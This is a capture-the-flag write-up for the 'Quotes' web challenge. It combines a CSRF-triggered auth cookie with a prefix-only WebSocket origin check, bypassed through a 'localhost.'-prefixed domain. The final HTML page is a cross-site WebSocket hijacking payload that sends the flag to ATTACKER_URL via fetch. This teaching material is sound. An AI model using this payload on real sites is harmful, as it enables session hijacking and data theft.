## Quotes

> Feeling lost? Why don't you come and get quotes from the wise?
>
> MD5 (quotes.tar.gz) = 3ba36e72cb0ee2186745673475de8cf7
>
> * 复读机

This was a simple client-side web exploitation challenge. From the `/share` endpoint we can submit a URL for the admin bot to visit.

```python
@app.route('/share', methods=['GET','POST'])
def share():
    if request.method == "GET":
        return render_template("share.html")
    else:
        if not request.form.get('url'):
            return "yes?"
        else:
            thread_a = Bot(request.form.get('url'))
            thread_a.start()
            return "nice quote, thanks for sharing!"

```

Let's take a look at the actual functionality of the web app! The flag can be found in the `/quote` WebSockets endpoint - as long as we satisfy the following conditions:

* The WebSocket client's origin must start with `http://localhost`
* The client must have the correct `auth` cookie

```python
@sockets.route('/quote')
def echo_socket(ws):
    print('/quote', flush=True)
    while not ws.closed:
        try:
            try:
                cookie = dict(i.split('=') for i in ws.handler.headers.get('Cookie').split('; '))
            except:
                cookie = {}

            # only admin from localhost can get the GreyCat's quote
            if ws.origin.startswith("http://localhost") and cookie.get('auth') == auth_token:
                ws.send(f"{os.environ['flag']}")
            else:
                ws.send(f"{quotes[random.randint(0,len(quotes))]}")
            ws.close()
        except Exception as e:
            print('error:',e, flush=True)
```

### Setting the Auth Cookie

The correct `auth` cookie is set at the `/auth` endpoint when the request is made locally by the admin bot.

```python
# authenticate localhost only
@app.route('/auth')
def auth():
    if request.remote_addr == "127.0.0.1":
        resp = make_response("authenticated")
        # I heard httponly defend against XSS(what is that?)
        resp.set_cookie("auth", auth_token, httponly=True)
    else:
        resp = make_response("unauthenticated")
    return resp

```

It is trivial to perform a GET-based CSRF through a top-level navigation to set the authentication cookie for the victim. We subsequently "sleep" for 1 second before continuing with the rest of the exploit to ensure that the nagivation was completed and the cookie was set.

```javascript
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

window.open("http://localhost:7070/auth");

await sleep(1000);
```

### Bypassing the Origin Check

Although the WebSockets library used ([flask\_sockets](https://github.com/heroku-python/flask-sockets)) is pretty old, there is no vulnerability in the `ws.origin` provided - afterall, `gevent` is the one providing the necessary information in the WSGI environment.

The `ws.origin` value corresponds to that of the `Origin` request header, which is one of the [forbidden header names ](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden\_header\_name)that cannot be modified progammatically by JavaScript. __ This is a special request header that comprises of only the following three parts of the _current_ webpage URL:

```
<scheme>://<hostname>:<port>
```

Unless we find a browser zero-day that allows a malicious webpage to spoof `Origin` headers (this would be quite interesting), there is no way around our exploit page's origin needing to start with `http://localhost`.

But is that sufficient validation to ensure the WebSocket connection came from a page hosted on the localhost? Nope! We could simply use a domain _starting with_ `localhost`, e.g. `localhost.zeyu2001.com`.

### Final Payload

Because there is no CSRF token being checked and because WebSockets are not restricted by the [Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin\_policy), we could use "cross-site WebSocket hijacking" to obtain and exfiltrate the flag.

The following page needs to be hosted on a domain starting with `localhost` and submitted to `/share`.

```markup
<html>
    <body>
        <script>
            (async () => {

                const sleep = async (ms) => {
                    return new Promise(resolve => setTimeout(resolve, ms));
                }

                window.open("http://localhost:7070/auth");

                await sleep(1000);

                const ws = new WebSocket('ws://localhost:7070/quote');

                ws.onopen = function open() {
                    ws.send('getquote');
                };

                ws.onmessage = function incoming(data) {
                    fetch("http://ATTACKER_URL/?quote=" + data.data)
                };
            })();
        </script>
    </body>
</html>
```
